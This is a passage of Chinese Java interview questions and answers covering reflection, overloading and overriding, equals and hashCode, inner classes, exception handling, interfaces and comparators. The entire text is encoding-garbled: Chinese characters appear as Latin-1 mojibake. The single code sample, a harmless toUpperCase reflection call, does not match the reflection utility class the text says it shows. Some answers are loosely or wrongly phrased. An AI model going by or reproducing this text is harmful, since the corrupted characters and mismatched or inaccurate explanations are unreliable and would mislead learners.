æ‰€çŸ¥ï¼Œä½†æ˜¯é€šè¿‡å‰ç«¯æ§åˆ¶å™¨å°±èƒ½å¤Ÿæ ¹æ®ä½ çš„è¯·æ±‚å¾—åˆ°ç›¸åº”çš„æœåŠ¡ã€‚è°ƒåœè€…æ¨¡å¼ä¹Ÿå¯ä»¥ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥è¯´æ˜ï¼Œä¾‹å¦‚ä¸€å°è®¡ç®—æœºï¼ŒCPUã€å†…å­˜ã€ç¡¬ç›˜ã€æ˜¾å¡ã€å£°å¡å„ç§è®¾å¤‡éœ€è¦ç›¸äº’é…åˆæ‰èƒ½å¾ˆå¥½çš„å·¥ä½œï¼Œä½†æ˜¯å¦‚æœè¿™äº›ä¸œè¥¿éƒ½ç›´æ¥è¿æ¥åˆ°ä¸€èµ·ï¼Œè®¡ç®—æœºçš„å¸ƒçº¿å°†å¼‚å¸¸å¤æ‚ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸»æ¿ä½œä¸ºä¸€ä¸ªè°ƒåœè€…çš„èº«ä»½å‡ºç°ï¼Œå®ƒå°†å„ä¸ªè®¾å¤‡è¿æ¥åœ¨ä¸€èµ·è€Œä¸éœ€è¦æ¯ä¸ªè®¾å¤‡ä¹‹é—´ç›´æ¥äº¤æ¢æ•°æ®ï¼Œè¿™æ ·å°±å‡å°äº†ç³»ç»Ÿçš„è€¦åˆåº¦å’Œå¤æ‚åº¦ã€‚ å¦‚ä½•é€šè¿‡åå°„è·å–å’Œè®¾ç½®å¯¹è±¡ç§æœ‰å­—æ®µçš„å€¼ï¼Ÿ å¯ä»¥é€šè¿‡ç±»å¯¹è±¡çš„getDeclaredField()æ–¹æ³•å­—æ®µï¼ˆFieldï¼‰å¯¹è±¡ï¼Œç„¶åå†é€šè¿‡å­—æ®µå¯¹è±¡çš„setAccessible(true)å°†å…¶è®¾ç½®ä¸ºå¯ä»¥è®¿é—®ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡get/setæ–¹æ³•æ¥è·å–/è®¾ç½®å­—æ®µçš„å€¼äº†ã€‚ ä¸‹é¢çš„ä»£ç å®ç°äº†ä¸€ä¸ªåå°„çš„å·¥å…·ç±»ï¼Œå…¶ä¸­çš„ä¸¤ä¸ªé™æ€æ–¹æ³•åˆ†åˆ«ç”¨äºè·å–å’Œè®¾ç½®ç§æœ‰å­—æ®µçš„å€¼ï¼Œå­—æ®µå¯ä»¥æ˜¯åŸºæœ¬ç±»å‹ä¹Ÿå¯ä»¥æ˜¯å¯¹è±¡ç±»å‹ä¸”æ”¯æŒå¤šçº§å¯¹è±¡æ“ä½œï¼Œä¾‹å¦‚ReflectionUtil.get(dog, â€œowner.car.engine.idâ€);å¯ä»¥è·å¾—dogå¯¹è±¡çš„ä¸»äººçš„æ±½è½¦çš„å¼•æ“çš„IDå·ã€‚ import java.lang.reflect.Method; class MethodInvokeTest { public static void main(String[] args) throws Exception { String str = &quot;hello&quot;; Method m = str.getClass().getMethod(&quot;toUpperCase&quot;); System.out.println(m.invoke(str)); // HELLO } } è¯·è¯´æ˜é‡è½½ï¼ˆOverloadï¼‰å’Œé‡å†™ï¼ˆOverrideï¼‰çš„åŒºåˆ«ã€‚é‡è½½çš„æ–¹æ³•èƒ½å¦æ ¹æ®è¿”å›ç±»å‹è¿›è¡ŒåŒºåˆ†ï¼Ÿ æ–¹æ³•çš„é‡è½½å’Œé‡å†™éƒ½æ˜¯å®ç°å¤šæ€çš„æ–¹å¼ï¼Œ åŒºåˆ«åœ¨äºå‰è€…å®ç°çš„æ˜¯ç¼–è¯‘æ—¶çš„å¤šæ€æ€§ï¼Œè€Œåè€…å®ç°çš„æ˜¯è¿è¡Œæ—¶çš„å¤šæ€æ€§ã€‚ é‡è½½å‘ç”Ÿåœ¨ä¸€ä¸ªç±»ä¸­ï¼ŒåŒåçš„æ–¹æ³•å¦‚æœæœ‰ä¸åŒçš„å‚æ•°åˆ—è¡¨ï¼ˆå‚æ•°ç±»å‹ä¸åŒã€å‚æ•°ä¸ªæ•°ä¸åŒæˆ–è€…äºŒè€…éƒ½ä¸åŒï¼‰åˆ™è§†ä¸ºé‡è½½ï¼›é‡å†™å‘ç”Ÿåœ¨å­ç±»ä¸çˆ¶ç±»ä¹‹é—´ï¼Œé‡å†™è¦æ±‚å­ç±»è¢«é‡å†™æ–¹æ³•ä¸çˆ¶ç±»è¢«é‡å†™æ–¹æ³•æœ‰ç›¸åŒçš„è¿”å›ç±»å‹ï¼Œæ¯”çˆ¶ç±»è¢«é‡å†™æ–¹æ³•æ›´å¥½è®¿é—®ï¼Œä¸èƒ½æ¯”çˆ¶ç±»è¢«é‡å†™æ–¹æ³•å£°æ˜æ›´å¤šçš„å¼‚å¸¸ï¼ˆé‡Œæ°ä»£æ¢åŸåˆ™ï¼‰ã€‚é‡è½½å¯¹è¿”å›ç±»å‹æ²¡æœ‰ç‰¹æ®Šçš„è¦æ±‚ã€‚ ä¸¤ä¸ªå¯¹è±¡å€¼ç›¸åŒ(x.equals(y) == true)ï¼Œä½†å´å¯æœ‰ä¸åŒçš„hash codeï¼Œè¯¥è¯´æ³•æ˜¯å¦æ­£ç¡®ï¼Œä¸ºä»€ä¹ˆï¼Ÿ ä¸å¯¹ï¼Œå¦‚æœä¸¤ä¸ªå¯¹è±¡xå’Œyæ»¡è¶³x.equals(y) == trueï¼Œå®ƒä»¬çš„å“ˆå¸Œç ï¼ˆhash codeï¼‰åº”å½“ç›¸åŒã€‚Javaå¯¹äºeqaulsæ–¹æ³•å’ŒhashCodeæ–¹æ³•æ˜¯è¿™æ ·è§„å®šçš„ï¼š (1)å¦‚æœä¸¤ä¸ªå¯¹è±¡ç›¸åŒï¼ˆequalsæ–¹æ³•è¿”å›trueï¼‰ï¼Œé‚£ä¹ˆå®ƒä»¬çš„hashCodeå€¼ä¸€å®šè¦ç›¸åŒï¼› (2)å¦‚æœä¸¤ä¸ªå¯¹è±¡çš„hashCodeç›¸åŒï¼Œå®ƒä»¬å¹¶ä¸ä¸€å®šç›¸åŒã€‚ å½“ç„¶ï¼Œä½ æœªå¿…è¦æŒ‰ç…§è¦æ±‚å»åšï¼Œä½†æ˜¯å¦‚æœä½ è¿èƒŒäº†ä¸Šè¿°åŸåˆ™å°±ä¼šå‘ç°åœ¨ä½¿ç”¨å®¹å™¨æ—¶ï¼Œç›¸åŒçš„å¯¹è±¡å¯ä»¥å‡ºç°åœ¨Seté›†åˆä¸­ï¼ŒåŒæ—¶å¢åŠ æ–°å…ƒç´ çš„æ•ˆç‡ä¼šå¤§å¤§ä¸‹é™ï¼ˆå¯¹äºä½¿ç”¨å“ˆå¸Œå­˜å‚¨çš„ç³»ç»Ÿï¼Œå¦‚æœå“ˆå¸Œç é¢‘ç¹çš„å†²çªå°†ä¼šé€ æˆå­˜å–æ€§èƒ½æ€¥å‰§ä¸‹é™ï¼‰ã€‚ è¯·è¯´æ˜å†…éƒ¨ç±»å¯ä»¥å¼•ç”¨ä»–åŒ…å«ç±»çš„æˆå‘˜å—ï¼Œå¦‚æœå¯ä»¥ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆé™åˆ¶å—ï¼Ÿ ä¸€ä¸ªå†…éƒ¨ç±»å¯¹è±¡å¯ä»¥è®¿é—®åˆ›å»ºå®ƒçš„å¤–éƒ¨ç±»å¯¹è±¡çš„å†…å®¹ï¼Œå†…éƒ¨ç±»å¦‚æœä¸æ˜¯staticçš„ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥è®¿é—®åˆ›å»ºå®ƒçš„å¤–éƒ¨ç±»å¯¹è±¡çš„æ‰€æœ‰å±æ€§.å†…éƒ¨ç±»å¦‚æœæ˜¯satticçš„ï¼Œå³ä¸ºnested classï¼Œé‚£ä¹ˆå®ƒåªå¯ä»¥è®¿é—®åˆ›å»ºå®ƒçš„å¤–éƒ¨ç±»å¯¹è±¡çš„æ‰€æœ‰staticå±æ€§ä¸€èˆ¬æ™®é€šç±»åªæœ‰publicæˆ–packageçš„è®¿é—®ä¿®é¥°ï¼Œè€Œå†…éƒ¨ç±»å¯ä»¥å®ç°staticï¼Œprotectedï¼Œprivateç­‰è®¿é—®ä¿®é¥°ã€‚å½“ä»å¤–éƒ¨ç±»ç»§æ‰¿çš„æ—¶å€™ï¼Œå†…éƒ¨ç±»æ˜¯ä¸ä¼šè¢«è¦†ç›–çš„ï¼Œå®ƒä»¬æ˜¯å®Œå…¨ç‹¬ç«‹çš„å®ä½“ï¼Œæ¯ä¸ªéƒ½åœ¨è‡ªå·±çš„å‘½åç©ºé—´å†…ï¼Œå¦‚æœä»å†…éƒ¨ç±»ä¸­æ˜ç¡®åœ°ç»§æ‰¿ï¼Œå°±å¯ä»¥è¦†ç›–åŸæ¥å†…éƒ¨ç±»çš„æ–¹æ³•ã€‚ è¯·è¯´æ˜JAVAè¯­è¨€å¦‚ä½•è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼Œå…³é”®å­—ï¼šthrows,throw,try,catch,finallyåˆ†åˆ«ä»£è¡¨ä»€ä¹ˆæ„ä¹‰ï¼Ÿåœ¨tryå—ä¸­å¯ä»¥æŠ›å‡ºå¼‚å¸¸å—ï¼Ÿ Java é€šè¿‡é¢å‘å¯¹è±¡çš„æ–¹æ³•è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼ŒæŠŠå„ç§ä¸åŒçš„å¼‚å¸¸è¿›è¡Œåˆ†ç±»ï¼Œå¹¶æä¾›äº†è‰¯å¥½çš„æ¥å£ã€‚åœ¨Javaä¸­ï¼Œæ¯ä¸ªå¼‚å¸¸éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒæ˜¯Throwableç±»æˆ–å…¶å®ƒå­ç±»çš„å®ä¾‹ã€‚å½“ä¸€ä¸ªæ–¹æ³•å‡ºç°å¼‚å¸¸åä¾¿æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸­åŒ…å«æœ‰å¼‚å¸¸ä¿¡æ¯ï¼Œè°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•å¯ä»¥æ•è·åˆ°è¿™ä¸ªå¼‚å¸¸å¹¶è¿›è¡Œå¤„ç†ã€‚ Javaçš„å¼‚å¸¸å¤„ç†æ˜¯é€šè¿‡5ä¸ªå…³é”®è¯æ¥å®ç°çš„ï¼štryã€catchã€throwã€throwså’Œfinallyã€‚ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ç”¨tryæ¥æ‰§è¡Œä¸€æ®µç¨‹åºï¼Œå¦‚æœå‡ºç°å¼‚å¸¸ï¼Œç³»ç»Ÿä¼šæŠ›å‡ºï¼ˆthrowsï¼‰ä¸€ä¸ªå¼‚å¸¸ï¼Œè¿™æ—¶å€™ä½ å¯ä»¥é€šè¿‡å®ƒçš„ç±»å‹æ¥æ•æ‰ï¼ˆcatchï¼‰å®ƒï¼Œæˆ–æœ€åï¼ˆfinallyï¼‰ç”±ç¼ºçœå¤„ç†å™¨æ¥å¤„ç†ã€‚ç”¨tryæ¥æŒ‡å®šä¸€å—é¢„é˜²æ‰€æœ‰â€å¼‚å¸¸â€çš„ç¨‹åºã€‚ç´§è·Ÿåœ¨tryç¨‹åºåé¢ï¼Œåº”åŒ…å«ä¸€ä¸ªcatchå­å¥æ¥æŒ‡å®šä½ æƒ³è¦æ•æ‰çš„â€å¼‚å¸¸â€çš„ç±»å‹ã€‚throwè¯­å¥ç”¨æ¥æ˜ç¡®åœ°æŠ›å‡ºä¸€ä¸ªâ€å¼‚å¸¸â€ã€‚throwsç”¨æ¥æ ‡æ˜ä¸€ä¸ªæˆå‘˜å‡½æ•°å¯èƒ½æŠ›å‡ºçš„å„ç§â€å¼‚å¸¸â€ã€‚Finallyä¸ºç¡®ä¿ä¸€æ®µä»£ç ä¸ç®¡å‘ç”Ÿä»€ä¹ˆâ€å¼‚å¸¸â€éƒ½è¢«æ‰§è¡Œä¸€æ®µä»£ç ã€‚å¯ä»¥åœ¨ä¸€ä¸ªæˆå‘˜å‡½æ•°è°ƒç”¨çš„å¤–é¢å†™ä¸€ä¸ªtryè¯­å¥ï¼Œåœ¨è¿™ä¸ªæˆå‘˜å‡½æ•°å†…éƒ¨å†™å¦ä¸€ä¸ªtryè¯­å¥ä¿æŠ¤å…¶ä»–ä»£ç ã€‚æ¯å½“é‡åˆ°ä¸€ä¸ªtryè¯­å¥ï¼Œâ€å¼‚å¸¸â€œçš„æ¡†æ¶å°±æ”¾åˆ°å †æ ˆä¸Šé¢ï¼Œç›´åˆ°æ‰€æœ‰çš„tryè¯­å¥éƒ½å®Œæˆã€‚å¦‚æœä¸‹ä¸€çº§çš„tryè¯­å¥æ²¡æœ‰å¯¹æŸç§â€å¼‚å¸¸â€è¿›è¡Œå¤„ç†ï¼Œå †æ ˆå°±ä¼šå±•å¼€ï¼Œç›´åˆ°é‡åˆ°æœ‰å¤„ç†è¿™ç§â€å¼‚å¸¸â€çš„tryè¯­å¥ã€‚ è¯·è¯´æ˜Javaçš„æ¥å£å’ŒC++çš„è™šç±»çš„ç›¸åŒå’Œä¸åŒå¤„ ç”±äºJavaä¸æ”¯æŒå¤šç»§æ‰¿ï¼Œè€Œæœ‰å¯èƒ½æŸä¸ªç±»æˆ–å¯¹è±¡è¦ä½¿ç”¨åˆ†åˆ«åœ¨å‡ ä¸ªç±»æˆ–å¯¹è±¡é‡Œé¢çš„æ–¹æ³•æˆ–å±æ€§ï¼Œç°æœ‰çš„å•ç»§æ‰¿æœºåˆ¶å°±ä¸èƒ½æ»¡è¶³è¦æ±‚ã€‚ä¸ç»§æ‰¿ç›¸æ¯”ï¼Œæ¥å£æœ‰æ›´é«˜çš„çµæ´»æ€§ï¼Œå› ä¸ºæ¥å£ä¸­æ²¡æœ‰ä»»ä½•å®ç°ä»£ç ã€‚å½“ä¸€ä¸ªç±»å®ç°äº†æ¥å£ä»¥åï¼Œè¯¥ç±»è¦å®ç°æ¥å£é‡Œé¢æ‰€æœ‰çš„æ–¹æ³•å’Œå±æ€§ï¼Œå¹¶ä¸”æ¥å£é‡Œé¢çš„å±æ€§åœ¨é»˜è®¤çŠ¶æ€ä¸‹é¢éƒ½æ˜¯public static,æ‰€æœ‰æ–¹æ³•é»˜è®¤æƒ…å†µä¸‹æ˜¯public.ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ã€‚ å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå‚æ•°ä¼ é€’ç»™ä¸€ä¸ªæ–¹æ³•åï¼Œæ­¤æ–¹æ³•å¯æ”¹å˜è¿™ä¸ªå¯¹è±¡çš„å±æ€§ï¼Œå¹¶å¯è¿”å›å˜åŒ–åçš„ç»“æœï¼Œé‚£ä¹ˆè¿™é‡Œåˆ°åº•æ˜¯å€¼ä¼ é€’è¿˜æ˜¯å¼•ç”¨ä¼ é€’? æ˜¯å€¼ä¼ é€’ã€‚Java ç¼–ç¨‹è¯­è¨€åªæœ‰å€¼ä¼ é€’å‚æ•°ã€‚å½“ä¸€ä¸ªå¯¹è±¡å®ä¾‹ä½œä¸ºä¸€ä¸ªå‚æ•°è¢«ä¼ é€’åˆ°æ–¹æ³•ä¸­æ—¶ï¼Œå‚æ•°çš„å€¼å°±æ˜¯å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨ã€‚å¯¹è±¡çš„å†…å®¹å¯ä»¥åœ¨è¢«è°ƒç”¨çš„æ–¹æ³•ä¸­æ”¹å˜ï¼Œä½†å¯¹è±¡çš„å¼•ç”¨æ˜¯æ°¸è¿œä¸ä¼šæ”¹å˜çš„ã€‚ è¯·ä½ è¯´è¯´Static Nested Class å’Œ Inner Classçš„ä¸åŒ Static Nested Classæ˜¯è¢«å£°æ˜ä¸ºé™æ€ï¼ˆstaticï¼‰çš„å†…éƒ¨ç±»ï¼Œå®ƒå¯ä»¥ä¸ä¾èµ–äºå¤–éƒ¨ç±»å®ä¾‹è¢«å®ä¾‹åŒ–ã€‚è€Œé€šå¸¸çš„å†…éƒ¨ç±»éœ€è¦åœ¨å¤–éƒ¨ç±»å®ä¾‹åŒ–åæ‰èƒ½å®ä¾‹åŒ–ã€‚Static-Nested Class çš„æˆå‘˜, æ—¢å¯ä»¥å®šä¹‰ä¸ºé™æ€çš„(static), ä¹Ÿå¯ä»¥å®šä¹‰ä¸ºåŠ¨æ€çš„(instance).Nested Classçš„é™æ€æˆå‘˜(Method)åªèƒ½å¯¹Outer Classçš„é™æ€æˆå‘˜(static memebr)è¿›è¡Œæ“ä½œ(ACCESS), è€Œä¸èƒ½Access Outer Classçš„åŠ¨æ€æˆå‘˜(instance member).è€Œ Nested Classçš„åŠ¨æ€æˆå‘˜(instance method) å´å¯ä»¥ Access Outer Classçš„æ‰€æœ‰æˆå‘˜, è¿™ä¸ªæ¦‚å¿µå¾ˆé‡è¦, è®¸å¤šäººå¯¹è¿™ä¸ªæ¦‚å¿µæ¨¡ç³Š. æœ‰ä¸€ä¸ªæ™®é€šçš„åŸåˆ™, å› ä¸ºé™æ€æ–¹æ³•(static method) æ€»æ˜¯è·Ÿ CLASS ç›¸å…³è”(bind CLASS), è€ŒåŠ¨æ€æ–¹æ³•( (instance method) æ€»æ˜¯è·Ÿ instance object ç›¸å…³è”, æ‰€ä»¥,é™æ€æ–¹æ³•(static method)æ°¸è¿œä¸å¯ä»¥Accessè·Ÿ object ç›¸å…³çš„åŠ¨æ€æˆå‘˜(instance member),åè¿‡æ¥å°±å¯ä»¥, ä¸€ä¸ªCLASSçš„ instance object å¯ä»¥ Access è¿™ä¸ª Class çš„ä»»ä½•æˆå‘˜, åŒ…æ‹¬é™æ€æˆå‘˜(static member). è¯·ä½ è®²è®²abstract classå’Œinterfaceæœ‰ä»€ä¹ˆåŒºåˆ«?å£°æ˜æ–¹æ³•çš„å­˜åœ¨è€Œä¸å»å®ç°å®ƒçš„ç±»è¢«å«åšæŠ½è±¡ç±»ï¼ˆabstract classï¼‰ï¼Œå®ƒç”¨äºè¦åˆ›å»ºä¸€ä¸ªä½“ç°æŸäº›åŸºæœ¬è¡Œä¸ºçš„ç±»ï¼Œå¹¶ä¸ºè¯¥ç±»å£°æ˜æ–¹æ³•ï¼Œä½†ä¸èƒ½åœ¨è¯¥ç±»ä¸­å®ç°è¯¥ç±»çš„æƒ…å†µã€‚ä¸èƒ½åˆ›å»ºabstract ç±»çš„å®ä¾‹ã€‚ç„¶è€Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå˜é‡ï¼Œå…¶ç±»å‹æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå¹¶è®©å®ƒæŒ‡å‘å…·ä½“å­ç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚ä¸èƒ½æœ‰æŠ½è±¡æ„é€ å‡½æ•°æˆ–æŠ½è±¡é™æ€æ–¹æ³•ã€‚Abstract ç±»çš„å­ç±»ä¸ºå®ƒä»¬çˆ¶ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•æä¾›å®ç°ï¼Œå¦åˆ™å®ƒä»¬ä¹Ÿæ˜¯æŠ½è±¡ç±»ä¸ºã€‚å–è€Œä»£ä¹‹ï¼Œåœ¨å­ç±»ä¸­å®ç°è¯¥æ–¹æ³•ã€‚çŸ¥é“å…¶è¡Œä¸ºçš„å…¶å®ƒç±»å¯ä»¥åœ¨ç±»ä¸­å®ç°è¿™äº›æ–¹æ³•ã€‚ æ¥å£ï¼ˆinterfaceï¼‰æ˜¯æŠ½è±¡ç±»çš„å˜ä½“ã€‚åœ¨æ¥å£ä¸­ï¼Œæ‰€æœ‰æ–¹æ³•éƒ½æ˜¯æŠ½è±¡çš„ã€‚å¤šç»§æ‰¿æ€§å¯é€šè¿‡å®ç°è¿™æ ·çš„æ¥å£è€Œè·å¾—ã€‚æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯æŠ½è±¡çš„ï¼Œæ²¡æœ‰ä¸€ä¸ªæœ‰ç¨‹åºä½“ã€‚æ¥å£åªå¯ä»¥å®šä¹‰static finalæˆå‘˜å˜é‡ã€‚æ¥å£çš„å®ç°ä¸å­ç±»ç›¸ä¼¼ï¼Œé™¤äº†è¯¥å®ç°ç±»ä¸èƒ½ä»æ¥å£å®šä¹‰ä¸­ç»§æ‰¿è¡Œä¸ºã€‚å½“ç±»å®ç°ç‰¹æ®Šæ¥å£æ—¶ï¼Œå®ƒå®šä¹‰ï¼ˆå³å°†ç¨‹åºä½“ç»™äºˆï¼‰æ‰€æœ‰è¿™ç§æ¥å£çš„æ–¹æ³•ã€‚ç„¶åï¼Œå®ƒå¯ä»¥åœ¨å®ç°äº†è¯¥æ¥å£çš„ç±»çš„ä»»ä½•å¯¹è±¡ä¸Šè°ƒç”¨æ¥å£çš„æ–¹æ³•ã€‚ç”±äºæœ‰æŠ½è±¡ç±»ï¼Œå®ƒå…è®¸ä½¿ç”¨æ¥å£åä½œä¸ºå¼•ç”¨å˜é‡çš„ç±»å‹ã€‚é€šå¸¸çš„åŠ¨æ€è”ç¼–å°†ç”Ÿæ•ˆã€‚å¼•ç”¨å¯ä»¥è½¬æ¢åˆ°æ¥å£ç±»å‹æˆ–ä»æ¥å£ç±»å‹è½¬æ¢ï¼Œinstanceof è¿ç®—ç¬¦å¯ä»¥ç”¨æ¥å†³å®šæŸå¯¹è±¡çš„ç±»æ˜¯å¦å®ç°äº†æ¥å£ã€‚ è¯·è¯´æ˜Overloadå’ŒOverrideçš„åŒºåˆ«ï¼ŒOverloadedçš„æ–¹æ³•æ˜¯å¦å¯ä»¥æ”¹å˜è¿”å›å€¼çš„ç±»å‹? æ–¹æ³•çš„é‡å†™Overridingå’Œé‡è½½Overloadingæ˜¯Javaå¤šæ€æ€§çš„ä¸åŒè¡¨ç°ã€‚é‡å†™Overridingæ˜¯çˆ¶ç±»ä¸å­ç±»ä¹‹é—´å¤šæ€æ€§çš„ä¸€ç§è¡¨ç°ï¼Œé‡è½½Overloadingæ˜¯ä¸€ä¸ªç±»ä¸­å¤šæ€æ€§çš„ä¸€ç§è¡¨ç°ã€‚å¦‚æœåœ¨å­ç±»ä¸­å®šä¹‰æŸæ–¹æ³•ä¸å…¶çˆ¶ç±»æœ‰ç›¸åŒçš„åç§°å’Œå‚æ•°ï¼Œæˆ‘ä»¬è¯´è¯¥æ–¹æ³•è¢«é‡å†™(Overriding)ã€‚å­ç±»çš„å¯¹è±¡ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œå°†è°ƒç”¨å­ç±»ä¸­çš„å®šä¹‰ï¼Œå¯¹å®ƒè€Œè¨€ï¼Œçˆ¶ç±»ä¸­çš„å®šä¹‰å¦‚åŒè¢«â€å±è”½â€äº†ã€‚å¦‚æœåœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰äº†å¤šä¸ªåŒåçš„æ–¹æ³•ï¼Œå®ƒä»¬æˆ–æœ‰ä¸åŒçš„å‚æ•°ä¸ªæ•°æˆ–æœ‰ä¸åŒçš„å‚æ•°ç±»å‹ï¼Œåˆ™ç§°ä¸ºæ–¹æ³•çš„é‡è½½(Overloading)ã€‚Overloadedçš„æ–¹æ³•æ˜¯å¯ä»¥æ”¹å˜è¿”å›å€¼çš„ç±»å‹ã€‚ è¯·è¯´æ˜ä¸€ä¸‹final, finally, finalizeçš„åŒºåˆ«ã€‚final ç”¨äºå£°æ˜å±æ€§ï¼Œæ–¹æ³•å’Œç±»ï¼Œåˆ†åˆ«è¡¨ç¤ºå±æ€§ä¸å¯å˜ï¼Œæ–¹æ³•ä¸å¯è¦†ç›–ï¼Œç±»ä¸å¯ç»§æ‰¿ã€‚finallyæ˜¯å¼‚å¸¸å¤„ç†è¯­å¥ç»“æ„çš„ä¸€éƒ¨åˆ†ï¼Œè¡¨ç¤ºæ€»æ˜¯æ‰§è¡Œã€‚finalizeæ˜¯Objectç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨åƒåœ¾æ”¶é›†å™¨æ‰§è¡Œçš„æ—¶å€™ä¼šè°ƒç”¨è¢«å›æ”¶å¯¹è±¡çš„æ­¤æ–¹æ³•ï¼Œå¯ä»¥è¦†ç›–æ­¤æ–¹æ³•æä¾›åƒåœ¾æ”¶é›†æ—¶çš„å…¶ä»–èµ„æºå›æ”¶ï¼Œä¾‹å¦‚å…³é—­æ–‡ä»¶ç­‰ã€‚ é¢å‘å¯¹è±¡çš„ç‰¹å¾æœ‰å“ªäº›æ–¹é¢æŠ½è±¡ï¼šæŠ½è±¡å°±æ˜¯å¿½ç•¥ä¸€ä¸ªä¸»é¢˜ä¸­ä¸å½“å‰ç›®æ ‡æ— å…³çš„é‚£äº›æ–¹é¢ï¼Œä»¥ä¾¿æ›´å……åˆ†åœ°æ³¨æ„ä¸å½“å‰ç›®æ ‡æœ‰å…³çš„æ–¹é¢ã€‚æŠ½è±¡å¹¶ä¸æ‰“ç®—äº†è§£å…¨éƒ¨é—®é¢˜ï¼Œè€Œåªæ˜¯é€‰æ‹©å…¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œæš‚æ—¶ä¸ç”¨éƒ¨åˆ†ç»†èŠ‚ã€‚æŠ½è±¡åŒ…æ‹¬ä¸¤ä¸ªæ–¹é¢ï¼Œä¸€æ˜¯è¿‡ç¨‹æŠ½è±¡ï¼ŒäºŒæ˜¯æ•°æ®æŠ½è±¡ã€‚ç»§æ‰¿ï¼šç»§æ‰¿æ˜¯ä¸€ç§è”ç»“ç±»çš„å±‚æ¬¡æ¨¡å‹ï¼Œå¹¶ä¸”å…è®¸å’Œé¼“åŠ±ç±»çš„é‡ç”¨ï¼Œå®ƒæä¾›äº†ä¸€ç§æ˜ç¡®è¡¨è¿°å…±æ€§çš„æ–¹æ³•ã€‚å¯¹è±¡çš„ä¸€ä¸ªæ–°ç±»å¯ä»¥ä»ç°æœ‰çš„ç±»ä¸­æ´¾ç”Ÿï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºç±»ç»§æ‰¿ã€‚æ–°ç±»ç»§æ‰¿äº†åŸå§‹ç±»çš„ç‰¹æ€§ï¼Œæ–°ç±»ç§°ä¸ºåŸå§‹ç±»çš„æ´¾ç”Ÿç±»ï¼ˆå­ç±»ï¼‰ï¼Œè€ŒåŸå§‹ç±»ç§°ä¸ºæ–°ç±»çš„åŸºç±»ï¼ˆçˆ¶ç±»ï¼‰ã€‚æ´¾ç”Ÿç±»å¯ä»¥ä»å®ƒçš„åŸºç±»é‚£é‡Œç»§æ‰¿æ–¹æ³•å’Œå®ä¾‹å˜é‡ï¼Œå¹¶ä¸”ç±»å¯ä»¥ä¿®æ”¹æˆ–å¢åŠ æ–°çš„æ–¹æ³•ä½¿ä¹‹æ›´é€‚åˆç‰¹æ®Šçš„éœ€è¦ã€‚å°è£…ï¼šå°è£…æ˜¯æŠŠè¿‡ç¨‹å’Œæ•°æ®åŒ…å›´èµ·æ¥ï¼Œå¯¹æ•°æ®çš„è®¿é—®åªèƒ½é€šè¿‡å·²å®šä¹‰çš„ç•Œé¢ã€‚é¢å‘å¯¹è±¡è®¡ç®—å§‹äºè¿™ä¸ªåŸºæœ¬æ¦‚å¿µï¼Œå³ç°å®ä¸–ç•Œå¯ä»¥è¢«æç»˜æˆä¸€ç³»åˆ—å®Œå…¨è‡ªæ²»ã€å°è£…çš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡é€šè¿‡ä¸€ä¸ªå—ä¿æŠ¤çš„æ¥å£è®¿é—®å…¶ä»–å¯¹è±¡ã€‚å¤šæ€ï¼šå¤šæ€æ€§æ˜¯æŒ‡å…è®¸ä¸åŒç±»çš„å¯¹è±¡å¯¹åŒä¸€æ¶ˆæ¯ä½œå‡ºå“åº”ã€‚å¤šæ€æ€§åŒ…æ‹¬å‚æ•°åŒ–å¤šæ€æ€§å’ŒåŒ…å«å¤šæ€æ€§ã€‚å¤šæ€æ€§è¯­è¨€å…·æœ‰çµæ´»ã€æŠ½è±¡ã€è¡Œä¸ºå…±äº«ã€ä»£ç å…±äº«çš„ä¼˜åŠ¿ï¼Œå¾ˆå¥½çš„è§£å†³äº†åº”ç”¨ç¨‹åºå‡½æ•°åŒåé—®é¢˜ã€‚ è¯·è¯´æ˜Comparableå’ŒComparatoræ¥å£çš„ä½œç”¨ä»¥åŠå®ƒä»¬çš„åŒºåˆ«ã€‚ Javaæä¾›äº†åªåŒ…å«ä¸€ä¸ªcompareTo()æ–¹æ³•çš„Comparableæ¥å£ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥ä¸ªç»™ä¸¤ä¸ªå¯¹è±¡æ’åºã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒè¿”å›è´Ÿæ•°ï¼Œ0ï¼Œæ­£æ•°æ¥è¡¨æ˜è¾“å…¥å¯¹è±¡å°äºï¼Œç­‰äºï¼Œå¤§äºå·²ç»å­˜åœ¨çš„å¯¹è±¡ã€‚Javaæä¾›äº†åŒ…å«compare()å’Œequals()ä¸¤ä¸ªæ–¹æ³•çš„Comparatoræ¥å£ã€‚compare()æ–¹æ³•ç”¨æ¥ç»™ä¸¤ä¸ªè¾“å…¥å‚æ•°æ’åºï¼Œè¿”å›è´Ÿæ•°ï¼Œ0ï¼Œæ­£æ•°è¡¨æ˜ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å°äºï¼Œç­‰äºï¼Œå¤§äºç¬¬äºŒä¸ªå‚æ•°ã€‚equals()æ–¹æ³•éœ€è¦ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚